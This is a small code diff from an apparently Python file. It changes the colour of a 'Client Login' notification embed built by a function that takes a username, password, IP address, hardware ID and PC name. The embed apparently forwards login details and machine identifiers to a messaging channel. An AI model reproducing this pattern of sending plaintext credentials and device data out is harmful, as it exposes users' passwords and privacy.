@@ -198,7 +198,7 @@ def send_client_login(app_name, username, password, ip, hwid, pc_name):
         "embeds": [
             {
                 "title": "🔐 Client Login",
-                "color": 0x32CD32,
+                "color": 16711680,
                 "fields": [
                     {"name": "Application", "value": app_name, "inline": False},
                     {"name": "Username", "value": username, "inline": False},
